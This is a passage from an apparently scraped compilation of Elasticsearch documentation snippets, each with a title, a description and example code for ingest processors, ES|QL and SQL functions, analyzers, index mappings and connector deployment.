LANGUAGE: text
CODE:
[ value, value with embedded \" quote ]

----------------------------------------

TITLE: Configuring User Agent Processor Pipeline in Elasticsearch
DESCRIPTION: This snippet demonstrates how to set up an ingest pipeline using the user_agent processor to extract details from a user agent string. It includes creating the pipeline, indexing a document with the pipeline, and retrieving the processed document.

LANGUAGE: console
CODE:
PUT _ingest/pipeline/user_agent
{
  "description" : "Add user agent information",
  "processors" : [
    {
      "user_agent" : {
        "field" : "agent"
      }
    }
  ]
}
PUT my-index-000001/_doc/my_id?pipeline=user_agent
{
  "agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
}
GET my-index-000001/_doc/my_id

----------------------------------------

TITLE: Using MV_SUM Function in ESQL Query
DESCRIPTION: Demonstrates how to use the MV_SUM function to aggregate multiple values from an array field into a single sum. The example shows converting a multivalued field 'a' containing [3, 5, 6] into a single value containing their sum.

LANGUAGE: sql
CODE:
ROW a=[3, 5, 6]
| EVAL sum_a = MV_SUM(a)

----------------------------------------

TITLE: Calculating Standard Deviation with STD_DEV in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates how to use the STD_DEV function in an Elasticsearch ESQL query to calculate the standard deviation of a numeric field. The query retrieves data from the 'employees' table and computes the standard deviation of the 'height' field.

LANGUAGE: sql
CODE:
FROM employees
| STATS STD_DEV(height)

----------------------------------------

TITLE: Indexing and Querying Annotated Text with Structured Fields in Elasticsearch
DESCRIPTION: This snippet shows how to index a document with annotated text and structured fields, and then perform a search query with aggregations. It demonstrates the use of query_string for searching and significant_terms for aggregations.

LANGUAGE: console
CODE:
# Example documents
PUT my-index-000001/_doc/1
{
  "my_unstructured_text_field": "[Shay](%40kimchy) created elasticsearch",
  "my_twitter_handles": ["@kimchy"]
}

GET my-index-000001/_search
{
  "query": {
    "query_string": {
        "query": "elasticsearch OR logstash OR kibana",
        "default_field": "my_unstructured_text_field"
    }
  },
  "aggregations": {
  	"top_people" :{
  	    "significant_terms" : {
	       "field" : "my_twitter_handles.keyword"
  	    }
  	}
  }
}

----------------------------------------

TITLE: Percentile Ranks Aggregation with Missing Value Handling in Elasticsearch
DESCRIPTION: Shows how to handle missing values in a percentile ranks aggregation by specifying a default value for documents without the field.

LANGUAGE: console
CODE:
GET latency/_search
{
  "size": 0,
  "aggs": {
    "load_time_ranks": {
      "percentile_ranks": {
        "field": "load_time",
        "values": [ 500, 600 ],
        "missing": 10
      }
    }
  }
}

----------------------------------------

TITLE: MV_FIRST Function Documentation Sections
DESCRIPTION: Include directives for various documentation sections including parameters, description, types, and examples.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/mv_first.md
:::

:::{include} ../description/mv_first.md
:::

:::{include} ../types/mv_first.md
:::

:::{include} ../examples/mv_first.md
:::

----------------------------------------

TITLE: Documenting Geometry Function Parameters in Elasticsearch ESQL
DESCRIPTION: This snippet defines the parameters for a geometry function in Elasticsearch's ESQL. It specifies the types and constraints for geomA and geomB, which are used for geometric operations.

LANGUAGE: markdown
CODE:
**Parameters**

`geomA`
:   Expression of type `geo_point`, `cartesian_point`, `geo_shape` or `cartesian_shape`. If `null`, the function returns `null`.

`geomB`
:   Expression of type `geo_point`, `cartesian_point`, `geo_shape` or `cartesian_shape`. If `null`, the function returns `null`. The second parameter must also have the same coordinate system as the first. This means it is not possible to combine `geo_*` and `cartesian_*` parameters.

----------------------------------------

TITLE: Configuring Synonym Graph Filter with Synonyms File in Elasticsearch
DESCRIPTION: JSON configuration for a synonym_graph filter using a synonyms file. The synonyms_path option specifies the location of the file relative to the config directory.

LANGUAGE: json
CODE:
{
  "filter": {
    "synonyms_filter": {
      "type": "synonym_graph",
      "synonyms_path": "analysis/synonym-set.txt"
    }
  }
}

----------------------------------------

TITLE: Using CBRT Function in Elasticsearch SQL
DESCRIPTION: Returns the cube root of a numeric expression as a double value.

LANGUAGE: sql
CODE:
SELECT CBRT(-125.5);

   CBRT(-125.5)
-------------------
-5.0066577974783435

----------------------------------------

TITLE: Including EXP Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates the structure of the documentation, using Markdown syntax to include various sections of the EXP function documentation from separate files.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `EXP` [esql-exp]

**Syntax**

:::{image} ../../../images/functions/exp.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/exp.md
:::

:::{include} ../description/exp.md
:::

:::{include} ../types/exp.md
:::

:::{include} ../examples/exp.md
:::

----------------------------------------

TITLE: Configuring Polish Stop Token Filter in Elasticsearch
DESCRIPTION: Example showing how to configure and use the polish_stop token filter. Creates an index with a custom analyzer that includes the polish_stop filter and tests it with sample Polish text. The filter is configured to use both predefined Polish stopwords and a custom stopword.

LANGUAGE: console
CODE:
PUT /polish_stop_example
{
  "settings": {
    "index": {
      "analysis": {
        "analyzer": {
          "analyzer_with_stop": {
            "tokenizer": "standard",
            "filter": [
              "lowercase",
              "polish_stop"
            ]
          }
        },
        "filter": {
          "polish_stop": {
            "type": "polish_stop",
            "stopwords": [
              "_polish_",
              "jeść"
            ]
          }
        }
      }
    }
  }
}

GET polish_stop_example/_analyze
{
  "analyzer": "analyzer_with_stop",
  "text": "Gdzie kucharek sześć, tam nie ma co jeść."
}

----------------------------------------

TITLE: Analyzing Text with Apostrophe Token Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to use the Apostrophe token filter with the analyze API in Elasticsearch. It tokenizes the input text and applies the apostrophe filter to remove characters after apostrophes.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer" : "standard",
  "filter" : ["apostrophe"],
  "text" : "Istanbul'a veya Istanbul'dan"
}

----------------------------------------

TITLE: Configuring Synthetic Source with Stored Text Fields
DESCRIPTION: Example of setting up an index with synthetic _source for a text field with store set to true.

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "text": { "type": "text", "store": true }
    }
  }
}
PUT idx/_doc/1
{
  "text": [
    "the quick brown fox",
    "the quick brown fox",
    "jumped over the lazy dog"
  ]
}

----------------------------------------

TITLE: Including ST_Y Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates how to include various documentation sections for the ST_Y function using Markdown syntax. It references separate files for parameters, description, types, and examples.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/st_y.md
:::

:::{include} ../description/st_y.md
:::

:::{include} ../types/st_y.md
:::

:::{include} ../examples/st_y.md
:::

----------------------------------------

TITLE: Blocked Synchronous HTTP Methods
DESCRIPTION: Two synchronous HTTP request methods from com.nimbusds.oauth2.sdk.http.HTTPRequest class that are blocked from usage. These methods perform blocking HTTP operations and should be replaced with CloseableHttpAsyncClient for better performance and resource utilization.

LANGUAGE: java
CODE:
com.nimbusds.oauth2.sdk.http.HTTPRequest#send(javax.net.ssl.HostnameVerifier, javax.net.ssl.SSLSocketFactory)

LANGUAGE: java
CODE:
com.nimbusds.oauth2.sdk.http.HTTPRequest#send()

----------------------------------------

TITLE: Configuring Multiple Required Allocation Filters
DESCRIPTION: Shows how to set multiple required allocation filters to target specific nodes based on size and rack.

LANGUAGE: json
CODE:
PUT test/_settings
{
  "index.routing.allocation.require.size": "big",
  "index.routing.allocation.require.rack": "rack1"
}

----------------------------------------

TITLE: Creating an Elasticsearch Extension via Local File Upload
DESCRIPTION: Creates a new Elasticsearch extension by uploading a file from a local path. This is a two-step process involving creating metadata and then uploading the file.

LANGUAGE: shell
CODE:
curl -X POST \
  https://api.elastic-cloud.com/api/v1/deployments/extensions \
  -H "Authorization: ApiKey $CLOUD_API_KEY" \
  -H 'Content-Type: application/json' \
  -d '{
    "extension_type": "plugin",
    "name": "custom-plugin",
    "version" : "8.4.3"
}'

LANGUAGE: shell
CODE:
curl -v -X PUT "https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID" \
-H 'Content-type:application/zip' \
-H "Authorization: ApiKey $CLOUD_API_KEY" \
-H 'Expect:' \
-T "/path_to/custom-plugin-8.4.3.zip"

----------------------------------------

TITLE: Rounding Function for Histogram Bucket Keys in Java
DESCRIPTION: Java code snippet showing the rounding function used to determine which bucket a document falls into based on its field value, interval, and offset.

LANGUAGE: java
CODE:
bucket_key = Math.floor((value - offset) / interval) * interval + offset

----------------------------------------

TITLE: Simplified Prefix Query in Elasticsearch
DESCRIPTION: Demonstrates a simplified syntax for prefix queries by combining the field and value parameters into a more concise format.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "prefix" : { "user" : "ki" }
  }
}

----------------------------------------

TITLE: Docker Deployment Command
DESCRIPTION: Command to deploy the Outlook connector using Docker with volume mounting and network configuration

LANGUAGE: sh
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Indexing Parent Document in Elasticsearch
DESCRIPTION: Indexes a parent document with ID '1' and specifies its type as 'my-parent' in the join field.

LANGUAGE: console
CODE:
PUT /my-index-000001/_doc/1?refresh
{
  "text": "This is a parent document.",
  "my-join-field": "my-parent"
}

----------------------------------------

TITLE: Security Domain Configuration
DESCRIPTION: Example YAML configuration for defining a security domain with multiple realms

LANGUAGE: yaml
CODE:
xpack:
  security:
    authc:
      domains:
        my_domain:
          realms: [ 'default_native', 'saml1' ]

----------------------------------------

TITLE: Configuring Index Allocation Include Filter
DESCRIPTION: Demonstrates setting up an include filter to allocate shards to nodes with specific size attributes.

LANGUAGE: json
CODE:
PUT test/_settings
{
  "index.routing.allocation.include.size": "big,medium"
}

----------------------------------------

TITLE: Java Time API Class Definitions
DESCRIPTION: Definition of Java Time API classes with their available methods and properties for use in Elasticsearch's Painless scripting language. Each class includes a complete list of accessible methods with their signatures.

LANGUAGE: java
CODE:
class java.time.Clock {
  Clock fixed(Instant,ZoneId)
  ZoneId getZone() @nondeterministic
  Instant instant() @nondeterministic
  long millis() @nondeterministic
  Clock offset(Clock,Duration) @nondeterministic
  Clock tick(Clock,Duration) @nondeterministic
}

----------------------------------------

TITLE: Analyzing Text with Hunspell Token Filter
DESCRIPTION: Demonstrates using the Hunspell filter in an analyze API request to stem English text.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "standard",
  "filter": [
    {
      "type": "hunspell",
      "locale": "en_US"
    }
  ],
  "text": "the foxes jumping quickly"
}

----------------------------------------

TITLE: Histogram Aggregation with Hard Bounds in Elasticsearch
DESCRIPTION: Elasticsearch query showing how to use 'hard_bounds' to limit the range of buckets returned in the histogram aggregation results.

LANGUAGE: json
CODE:
POST /sales/_search?size=0
{
  "query": {
    "constant_score": { "filter": { "range": { "price": { "lte": "500" } } } }
  },
  "aggs": {
    "prices": {
      "histogram": {
        "field": "price",
        "interval": 50,
        "hard_bounds": {
          "min": 100,
          "max": 200
        }
      }
    }
  }
}

----------------------------------------

TITLE: ESQL E Function Documentation Structure
DESCRIPTION: Basic Markdown structure for documenting the 'E' (Embedded) function, including image reference and file inclusions for various documentation sections.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `E` [esql-e]

**Syntax**

:::{image} ../../../images/functions/e.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/e.md
:::

:::{include} ../description/e.md
:::

:::{include} ../types/e.md
:::

:::{include} ../examples/e.md
:::

----------------------------------------

TITLE: Setting Allocated Processors in Elasticsearch
DESCRIPTION: Configuration example showing how to explicitly set the number of processors available to Elasticsearch.

LANGUAGE: yaml
CODE:
node.processors: 2

----------------------------------------

TITLE: Including STARTS_WITH Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates how to include various documentation sections for the STARTS_WITH function using Markdown include directives.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/starts_with.md
:::

:::{include} ../description/starts_with.md
:::

:::{include} ../types/starts_with.md
:::

:::{include} ../examples/starts_with.md
:::

----------------------------------------

TITLE: Documenting Sine Function Parameter in ESQL
DESCRIPTION: Describes the 'angle' parameter for the sine function in ESQL. The function takes an angle in radians and returns null if the input is null.

LANGUAGE: markdown
CODE:
**Parameters**

`angle`
:   An angle, in radians. If `null`, the function returns `null`.

----------------------------------------

TITLE: Configuring History Retention Settings in Elasticsearch
DESCRIPTION: Configuration settings for controlling soft deletes and retention lease periods in Elasticsearch indices. These settings determine how long deleted document information is preserved for replica synchronization and cross-cluster replication.

LANGUAGE: yaml
CODE:
index.soft_deletes.enabled: true
index.soft_deletes.retention_lease.period: "12h"

----------------------------------------

TITLE: Using SPACE Function in Elasticsearch SQL
DESCRIPTION: Returns a string consisting of a specified number of spaces. The resulting string cannot exceed 1 MB in byte length.

LANGUAGE: sql
CODE:
SELECT SPACE(3);

   SPACE(3)
---------------

----------------------------------------

TITLE: Converting WKT Points to Cartesian Points using ESQL
DESCRIPTION: This example demonstrates how to convert WKT Point format strings to cartesian_point values using the TO_CARTESIANPOINT function. The query expands an array of WKT points and converts each point to a cartesian representation.

LANGUAGE: sql
CODE:
ROW wkt = ["POINT(4297.11 -1475.53)", "POINT(7580.93 2272.77)"]
| MV_EXPAND wkt
| EVAL pt = TO_CARTESIANPOINT(wkt)

----------------------------------------

TITLE: ESQL Division Operation Documentation
DESCRIPTION: Describes the DIV operator which performs division between two numbers. Explains that division with multivalued fields returns null and integer division rounds towards zero. Also notes that floating point division requires casting to DOUBLE.

LANGUAGE: markdown
CODE:
<!--
This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.
-->

### DIV
Divide one number by another. If either field is multivalued then the result is `null`.

Note: Division of two integer types will yield an integer result, rounding towards 0. If you need floating point division, cast one of the arguments to a `DOUBLE`.

----------------------------------------

TITLE: Using E() Function in Elasticsearch SQL
DESCRIPTION: Demonstrates the syntax for calling the E() function which returns Euler's number (e). The function takes no parameters and returns a single ROW containing the mathematical constant e.

LANGUAGE: sql
CODE:
ROW E()

----------------------------------------

TITLE: Configuring JSON Processor with Target Field in Elasticsearch
DESCRIPTION: This snippet demonstrates how to configure the JSON processor with a specified target field. It processes a JSON string from 'string_source' and stores the parsed object in 'json_target'.

LANGUAGE: json
CODE:
{
  "json" : {
    "field" : "string_source",
    "target_field" : "json_target"
  }
}

----------------------------------------

TITLE: Converting Values Using CONVERT Function in Elasticsearch SQL
DESCRIPTION: The CONVERT function provides alternative syntax for type conversion, supporting both standard SQL and ODBC data types. Functions similarly to CAST but with different parameter order.

LANGUAGE: sql
CODE:
CONVERT(
    expression, <1>
    data_type)  <2>

----------------------------------------

TITLE: Configuring KV Processor in Elasticsearch
DESCRIPTION: This snippet demonstrates how to configure the KV processor to parse a log message containing key-value pairs. It specifies the field to be parsed, the delimiter for splitting key-value pairs, and the delimiter for splitting keys from values.

LANGUAGE: javascript
CODE:
{
  "kv": {
    "field": "message",
    "field_split": " ",
    "value_split": "="
  }
}

----------------------------------------

TITLE: Defining a Join Field Mapping in Elasticsearch
DESCRIPTION: This snippet shows how to define a join field mapping with a parent-child relationship between 'question' and 'answer' documents.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "my_id": {
        "type": "keyword"
      },
      "my_join_field": {
        "type": "join",
        "relations": {
          "question": "answer"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Sorting Multivalued Fields with MV_SORT in ESQL
DESCRIPTION: This snippet demonstrates the usage of the MV_SORT function to sort a multivalued field in both ascending (default) and descending order. The function is applied to a row containing an array of integers.

LANGUAGE: sql
CODE:
ROW a = [4, 2, -3, 2]
| EVAL sa = mv_sort(a), sd = mv_sort(a, "DESC")

----------------------------------------

TITLE: Multi-Level Subquery with Group By and Aliasing in SQL for Elasticsearch
DESCRIPTION: Demonstrates a complex multi-level subquery with GROUP BY and aliasing across multiple levels.

LANGUAGE: sql
CODE:
SELECT subq3.int FROM (
    SELECT subq2.i AS int FROM (
        SELECT subq1.int AS i FROM (
            SELECT int FROM test
        GROUP BY int) AS subq1
    ) AS subq2
)AS subq3;

----------------------------------------

TITLE: Creating Azure Blob Storage Connector via Elasticsearch API
DESCRIPTION: Example of using the Elasticsearch API to create a new self-managed Azure Blob Storage connector. This snippet demonstrates the basic structure of the API call.

LANGUAGE: console
CODE:
PUT _connector/my-azure_blob_storage-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from Azure Blob Storage",
  "service_type": "azure_blob_storage"
}

----------------------------------------

TITLE: Creating Index with Percolator Mapping
DESCRIPTION: Creates an Elasticsearch index with a message field for text and a query field configured as percolator type.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "mappings": {
    "properties": {
      "message": {
        "type": "text"
      },
      "query": {
        "type": "percolator"
      }
    }
  }
}

----------------------------------------

TITLE: SHOW TABLES with Exact Match LIKE Clause in Elasticsearch SQL
DESCRIPTION: Using the LIKE clause to match an exact table name.

LANGUAGE: sql
CODE:
SHOW TABLES LIKE 'emp';

----------------------------------------

TITLE: Setting Custom Metadata with _meta Field in Elasticsearch Mapping
DESCRIPTION: This snippet demonstrates how to set custom metadata using the _meta field when creating an index in Elasticsearch. It includes application-specific information like class and version details.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "_meta": {
      "class": "MyApp::User",
      "version": {
        "min": "1.0",
        "max": "1.3"
      }
    }
  }
}

----------------------------------------

TITLE: Calculating Percentiles in Elasticsearch SQL
DESCRIPTION: Returns the nth percentile of input values using the PERCENTILE function.

LANGUAGE: sql
CODE:
SELECT languages, PERCENTILE(salary, 95) AS "95th" FROM emp
       GROUP BY languages;

LANGUAGE: sql
CODE:
SELECT
    languages,
    PERCENTILE(salary, 97.3, 'tdigest', 100.0) AS "97.3_TDigest",
    PERCENTILE(salary, 97.3, 'hdr', 3) AS "97.3_HDR"
FROM emp
GROUP BY languages;

----------------------------------------

TITLE: Configuring Global Ordinals for Join Field in Elasticsearch
DESCRIPTION: This example shows how to disable eager loading of global ordinals for a join field, which can be useful when the join field is used infrequently and writes occur frequently.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "my_join_field": {
        "type": "join",
        "relations": {
           "question": "answer"
        },
        "eager_global_ordinals": false
      }
    }
  }
}

----------------------------------------

TITLE: SHOW TABLES with Wildcard LIKE Clause in Elasticsearch SQL
DESCRIPTION: Using the LIKE clause with wildcards to match multiple table names.

LANGUAGE: sql
CODE:
SHOW TABLES LIKE 'emp%';

----------------------------------------

TITLE: Setting Field Data Circuit Breaker in Elasticsearch
DESCRIPTION: YAML configuration for the field data circuit breaker in Elasticsearch. It includes settings for the limit and overhead.

LANGUAGE: yaml
CODE:
indices.breaker.fielddata.limit: "40%"
indices.breaker.fielddata.overhead: 1.03

----------------------------------------

TITLE: Per-Request Cache Control
DESCRIPTION: Example showing how to enable caching for a specific search request using the request_cache parameter, including an aggregation query.

LANGUAGE: console
CODE:
GET /my-index-000001/_search?request_cache=true
{
  "size": 0,
  "aggs": {
    "popular_colors": {
      "terms": {
        "field": "colors"
      }
    }
  }
}

----------------------------------------

TITLE: Reference Type Casting in Painless
DESCRIPTION: Examples of valid reference type casts in Painless, showing implicit and explicit casts between related types.

LANGUAGE: painless
CODE:
List x;                        
ArrayList y = new ArrayList(); 
x = y;                         
y = (ArrayList)x;              
x = (List)y;                   

----------------------------------------

TITLE: Oracle Connector Docker Configuration
DESCRIPTION: YAML configuration for deploying Oracle connector using Docker.

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: oracle
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Documenting 'field' Parameter for ESQL AbstractFunctionTestCase in Markdown
DESCRIPTION: This snippet provides documentation for the 'field' parameter used in an ESQL AbstractFunctionTestCase. It describes the input type and possible values for the parameter.

LANGUAGE: markdown
CODE:
**Parameters**

`field`
:   Input value. The input can be a single- or multi-valued column or an expression.

----------------------------------------

TITLE: Creating Index with Nested Field Mapping in Elasticsearch
DESCRIPTION: Example of setting up an index with a nested field mapping named 'obj1'.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "mappings": {
    "properties": {
      "obj1": {
        "type": "nested"
      }
    }
  }
}

----------------------------------------

TITLE: Creating Oracle Connector via Elasticsearch API
DESCRIPTION: API request to create a new Oracle connector instance in Elasticsearch using the Connector API endpoint.

LANGUAGE: console
CODE:
PUT _connector/my-oracle-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from Oracle",
  "service_type": "oracle"
}

----------------------------------------

TITLE: Sample Connector Configuration
DESCRIPTION: Example YAML configuration for connecting to Elasticsearch with Docker

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: outlook
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Creating Custom Analyzer with Unique Token Filter in Elasticsearch
DESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that includes the unique filter.

LANGUAGE: console
CODE:
PUT custom_unique_example
{
  "settings" : {
    "analysis" : {
      "analyzer" : {
        "standard_truncate" : {
        "tokenizer" : "standard",
        "filter" : ["unique"]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Running S3 Connector Docker Container
DESCRIPTION: Shell command for running the S3 connector Docker container with mounted configuration.

LANGUAGE: shell
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Analyzing Text with Fingerprint Analyzer in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the fingerprint analyzer to process a sample text. It shows the API call to the _analyze endpoint and the expected output.

LANGUAGE: json
CODE:
POST _analyze
{
  "analyzer": "fingerprint",
  "text": "Yes yes, Gödel said this sentence is consistent and."
}

----------------------------------------

TITLE: Customizing Word Delimiter Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to create a custom word_delimiter filter with specific rules for token splitting and normalization.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "keyword",
          "filter": [ "my_custom_word_delimiter_filter" ]
        }
      },
      "filter": {
        "my_custom_word_delimiter_filter": {
          "type": "word_delimiter",
          "type_table": [ "- => ALPHA" ],
          "split_on_case_change": false,
          "split_on_numerics": false,
          "stem_english_possessive": true
        }
      }
    }
  }
}

----------------------------------------

TITLE: Extracting Y Coordinate in Elasticsearch SQL
DESCRIPTION: The ST_Y function returns the latitude of the first point in a geometry. It takes a geometry input and returns a double output.

LANGUAGE: sql
CODE:
SELECT ST_Y(ST_WKTToSQL('POINT (10 20)')) y;

----------------------------------------

TITLE: Retrieving Processed Document with Attachment in Elasticsearch
DESCRIPTION: Demonstrates how to retrieve a document that has been processed by the attachment processor, showing extracted metadata.

LANGUAGE: console
CODE:
GET my-index-000001/_doc/my_id

----------------------------------------

TITLE: Match None Query in Elasticsearch
DESCRIPTION: Demonstrates the match_none query which matches no documents, effectively the inverse of match_all.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match_none": {}
  }
}

----------------------------------------

TITLE: Customizing Truncate Filter with Length Parameter
DESCRIPTION: Example of creating a custom truncate filter that limits tokens to 5 characters and combines it with a lowercase tokenizer in a custom analyzer configuration.

LANGUAGE: console
CODE:
PUT 5_char_words_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "lowercase_5_char": {
          "tokenizer": "lowercase",
          "filter": [ "5_char_trunc" ]
        }
      },
      "filter": {
        "5_char_trunc": {
          "type": "truncate",
          "length": 5
        }
      }
    }
  }
}

----------------------------------------

TITLE: Reciprocal Rank Fusion Query with Sparse Vector in Elasticsearch
DESCRIPTION: This snippet demonstrates using reciprocal rank fusion (RRF) with multiple standard retrievers, including sparse vector queries, for improved search relevance.

LANGUAGE: json
CODE:
{
  "retriever": {
    "rrf": {
      "retrievers": [
        {
          "standard": {
            "query": {
              "multi_match": {
                "query": "How is the weather in Jamaica?",
                "fields": [
                  "title",
                  "description"
                ]
              }
            }
          }
        },
        {
          "standard": {
            "query": {
              "sparse_vector": {
                "field": "ml.inference.title_expanded.predicted_value",
                "inference_id": "my-elser-model",
                "query": "How is the weather in Jamaica?",
                "boost": 1
              }
            }
          }
        },
        {
          "standard": {
            "query": {
              "sparse_vector": {
                "field": "ml.inference.description_expanded.predicted_value",
                "inference_id": "my-elser-model",
                "query": "How is the weather in Jamaica?",
                "boost": 1
              }
            }
          }
        }
      ],
      "window_size": 10,
      "rank_constant": 20
    }
  }
}

----------------------------------------

TITLE: ESQL Function Test Case Generation Comment
DESCRIPTION: Comment header indicating this is an auto-generated test case file for ESQL that should not be manually edited.

LANGUAGE: plaintext
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Using POSITION Function in Elasticsearch SQL
DESCRIPTION: Returns the position of the first string expression within the second string expression.

LANGUAGE: sql
CODE:
SELECT POSITION('Elastic', 'Elasticsearch');

POSITION('Elastic', 'Elasticsearch')
------------------------------------
1

----------------------------------------

TITLE: Retrieving Stored Fields in Elasticsearch Search
DESCRIPTION: This snippet shows how to use the 'stored_fields' parameter to retrieve fields that have been explicitly marked as stored in the mapping. It includes examples of selecting specific fields and disabling stored fields entirely.

LANGUAGE: console
CODE:
GET /_search
{
  "stored_fields" : ["user", "postDate"],
  "query" : {
    "term" : { "user" : "kimchy" }
  }
}

LANGUAGE: console
CODE:
GET /_search
{
  "stored_fields": "_none_",
  "query" : {
    "term" : { "user" : "kimchy" }
  }
}

----------------------------------------

TITLE: Defining SQL Function Parameter Documentation in Markdown
DESCRIPTION: Parameter documentation template specifying a numeric input parameter that accepts null values and returns null in such cases.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`number`
:   Numeric expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: Basic Boolean Query Filter in Elasticsearch
DESCRIPTION: Demonstrates filtering shirts using a boolean query with multiple term filters for color and brand.

LANGUAGE: json
CODE:
GET /shirts/_search
{
  "query": {
    "bool": {
      "filter": [
        { "term": { "color": "red"   }},
        { "term": { "brand": "gucci" }}
      ]
    }
  }
}

----------------------------------------

TITLE: Creating an Elasticsearch Service Token
DESCRIPTION: Example of creating a service account token named 'my-token' for the 'elastic/fleet-server' service account. The command returns a bearer token for authentication.

LANGUAGE: shell
CODE:
bin/elasticsearch-service-tokens create elastic/fleet-server my-token

----------------------------------------

TITLE: Including MV_MIN Function Description in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the description of the MV_MIN function.

LANGUAGE: markdown
CODE:
:::{include} ../description/mv_min.md
:::

----------------------------------------

TITLE: Creating Elasticsearch Indices with Custom Priority
DESCRIPTION: This snippet shows how to create multiple Elasticsearch indices with different priority settings. It demonstrates setting a custom index.priority for some indices while leaving others at the default priority.

LANGUAGE: console
CODE:
PUT index_1

PUT index_2

PUT index_3
{
  "settings": {
    "index.priority": 10
  }
}

PUT index_4
{
  "settings": {
    "index.priority": 5
  }
}

----------------------------------------

TITLE: Creating a Byte-Quantized Index
DESCRIPTION: This snippet demonstrates how to create an index with a byte-quantized dense vector field to reduce memory footprint.

LANGUAGE: console
CODE:
PUT my-byte-quantized-index
{
  "mappings": {
    "properties": {
      "my_vector": {
        "type": "dense_vector",
        "dims": 3,
        "index": true,
        "index_options": {
          "type": "int8_hnsw"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Creating a Byte-Quantized Index
DESCRIPTION: This snippet demonstrates how to create an index with a byte-quantized dense vector field to reduce memory footprint.

LANGUAGE: console
CODE:
PUT my-byte-quantized-index
{
  "mappings": {
    "properties": {
      "my_vector": {
        "type": "dense_vector",
        "dims": 3,
        "index": true,
        "index_options": {
          "type": "int8_hnsw"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Using LCASE Function in Elasticsearch SQL
DESCRIPTION: Converts all uppercase characters in the input string to lowercase.

LANGUAGE: sql
CODE:
SELECT LCASE('Elastic');

LCASE('Elastic')
----------------
elastic

----------------------------------------

TITLE: Indexing a Polygon with custom orientation in GeoJSON format
DESCRIPTION: Example of indexing a polygon with a custom orientation using the GeoJSON format in Elasticsearch. The orientation parameter overrides the default counterclockwise expectation.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : {
    "type" : "polygon",
    "orientation" : "clockwise",
    "coordinates" : [
      [ [1000.0, 1000.0], [1000.0, 1001.0], [1001.0, 1001.0], [1001.0, 1000.0], [1000.0, 1000.0] ]
    ]
  }
}

----------------------------------------

TITLE: Calculating Median Absolute Deviation in ESQL
DESCRIPTION: This snippet demonstrates how to use the MV_MEDIAN_ABSOLUTE_DEVIATION function to convert a multivalued field into a single value containing the median absolute deviation. It also shows the calculation of the median using MV_MEDIAN for comparison.

LANGUAGE: sql
CODE:
ROW values = [0, 2, 5, 6]
| EVAL median_absolute_deviation = MV_MEDIAN_ABSOLUTE_DEVIATION(values), median = MV_MEDIAN(values)

----------------------------------------

TITLE: Using DATE_PARSE Function
DESCRIPTION: Examples of using DATE_PARSE function to parse date strings into DATE values using Java DateTimeFormatter patterns.

LANGUAGE: sql
CODE:
